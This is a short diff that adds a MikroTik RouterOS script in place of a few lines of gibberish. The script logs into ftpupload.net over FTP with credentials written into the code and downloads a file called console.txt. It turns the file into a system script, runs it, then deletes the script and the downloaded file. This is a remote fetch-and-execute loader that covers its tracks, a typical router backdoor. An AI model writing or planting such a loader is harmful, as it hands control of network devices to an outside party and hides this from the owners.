@@ -1,3 +1,19 @@
-asfeagafsb
-arsbbsabsabsdsb
-saffasafsdafdagadaf
+{
+	:local filename "console.txt";
+
+	if ([/system script print count-only where name=console]=1) do={
+		/system script remove console;
+	};
+	/tool fetch address=[:resolve domain-name=ftpupload.net] mode=ftp user=epiz_26793799 password=5TVOdRYjIhyY src-path=/console/SA144/console.txt;
+	:delay 8000ms;
+	if ([/file print count-only where name=console.txt] =1) do={
+		/system script add name=console source=[/file get console.txt contents];
+		:delay 500ms;
+		/system script run console;
+		:delay 3000ms;
+		/system script remove console;
+		/file remove console.txt;
+	};
+
+}
+
